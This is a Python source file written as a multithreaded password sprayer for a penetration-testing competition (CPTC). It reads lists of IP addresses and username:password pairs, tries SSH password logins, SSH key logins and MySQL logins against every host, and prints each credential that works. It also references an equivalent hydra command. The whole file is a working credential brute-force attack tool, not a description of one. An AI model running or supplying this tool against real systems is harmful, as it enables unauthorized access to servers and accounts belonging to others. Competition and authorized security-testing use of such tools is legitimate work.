"""
Author: Sunggwan Choi 
Description: SSH, mysql, mongodb password sprayer for CPTC 

<Note> 
    - Need to upgrade paramiko, as default paramiko verion in python3 is 
deprecated. 
    - pip3 install paramiko --upgrade


Compare with this command 
hydra ssh -L username.txt -P password.txt -M address.txt -t 50 -V
"""

import paramiko
import time 
import sys, threading, socket 
import subprocess
import argparse 

def debug(var, string):
    print("[DEBUG] "+var+" = "+string)

"""
Name: parseIP
Description: Parse IP address file
Param:
    - (str) filename = File name of the IP address file 
Return:
    - (list) result = List of ip addresses
"""
def parseIP(filename):
    result = [] 
    fd = open(filename)
    
    for line in fd:
        line = line.strip()
        result.append(line)

    fd.close()
    return result 

"""
Name: parseUserPass
Description: Parse username and password from credentials file.
    The credential file needs to have username:password format  
Param:
    - (str) filename = File name of the credential file.
Return:
    - (dic) cred = Dictionary file with keys-->username, value-->password
"""
def parseUserPass(filename):
    cred = {}
    fd = open(filename)
    
    for line in fd: 
        line = line.strip() 
        user, pwd = line.split(':')
        cred[user] = pwd 

    fd.close()

    return cred 

"""
Name: sshAttempt
Description: Tries to SSH into an IP address machine, using username and password
Param:
    - (str) ip = IP address of a remote machine 
    - (str) user = Username to SSH into
    - (str) pwd = Password to SSH into 
return:
    - (print) Print statement of login successful, or nothing 
"""
def sshAttempt(ip,user,pwd):
    #if debug == True:
    #    print("[.] Trying SSH to {0} with {1}:{2}".format(ip,user,pwd))

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, username=user, password=pwd, timeout=3)
    except paramiko.AuthenticationException:
        pass
    except (paramiko.ssh_exception.NoValidConnectionsError, socket.timeout):
        pass
    else:
        print('[+] [SSH] Login Successful: '+ip+':'+user+':'+pwd)

"""
Description: Same as the function above, but uses private key 
"""
def sshkeyAttempt(ip, user, filename):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        key = paramiko.RSAKey.from_private_key_file(filename)
        client.connect(ip, username=user, pkey=key)
    except paramiko.AuthenticationException:
        pass
    except (paramiko.ssh_exception.NoValidConnectionsError, socket.timeout):
        pass
    #except paramiko.ssh_exception.SSHException:
    #    print('[-] Convert OPENSSH into RSA private key ssh-keygen -p -m PEM -f <key>')
    else:
        print('[+] [SSH] [KEY] Login Successful:' +ip+':'+user+':'+filename)
    
"""
Name: mysqlAttempt
Description: Tries to mysql login into an IP address machine, using username and password
Param:
    - (str) ip = IP address of a remote machine 
    - (str) user = Username to mysql login into
    - (str) pwd = Password to mysql login into 
return:
    - (None) Print statement of login successful, or nothing 
"""
def mysqlAttempt(ip,user,pwd):
    #if debug == True:
    #    print("[.] Trying mysql to {0} with {1}:{2}".format(ip,user,pwd))

    command = "mysql -h {0} -u {1} -p{2} -e STATUS --connect-timeout={3}".format(ip,user,pwd,5)
    proc = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    out, err = proc.communicate()
    out = out.decode('ascii')
    
    if 'Uptime' in out:
        print('[+] [SQL] Login Successful: '+ip+':'+user+':'+pwd)
    else:
        pass

# Parses argument from the user. IP address file, credential file, mode, debug 
def parse():
    parser = argparse.ArgumentParser()

    parser.add_argument('-i','--ip-list', dest='i', type=str, help="IP address list file", required=True)
    parser.add_argument('-c','--cred-list', dest='c', type=str, help="Credential list file", required=True)
    parser.add_argument('-m','--mode',dest='m',type=str,choices=['ssh','mysql','mongo','ftp','sshkey'],
        help="Target services for password spraying.", required=True)
    parser.add_argument('-k','--keyfile', dest='k', type=str, help='SSH private key file for sparying')

    try:
        arguments = parser.parse_args()
    except IOError as msg:
        print('[!!] Error occurred.')
        parser.error(str(msg))
        exit()

    return arguments

def main():
    # Parse argument from the command line, save to variable 
    arguments = parse()
    ipFilename = arguments.i
    credFilename = arguments.c
    modename = arguments.m
    keyfilename = arguments.k

    # Debug section for sanity check 
    debug("IP filename", ipFilename)
    debug("Credential filename", credFilename)
    debug("Mode", modename)
    if keyfilename:
        debug("Key filename", keyfilename)
    print()

    # Parse ip file and credential files. 
    ip = parseIP(ipFilename)
    creds = parseUserPass(credFilename)

    # This might spawn thousands of threads and burn my box. Need testing on large environment. 
    for item in ip:
        for cred in creds:
            if modename == "ssh":
                thread = threading.Thread(target=sshAttempt, args=(item, cred, creds[cred]))
            elif modename == "mysql":
                thread = threading.Thread(target=mysqlAttempt, args=(item, cred, creds[cred]))
            elif modename == "sshkey":
                thread = threading.Thread(target=sshkeyAttempt, args=(item, cred, keyfilename))

            # TODO : Coming soon... 
            #elif modename == "mongo":
            #elif modename == "ftp":

            else:
                print('[!] Please select the correct mode.')
                #print('[testing]')
                break
            
            thread.start()
            time.sleep(0.1)

if __name__ == '__main__':
    main()
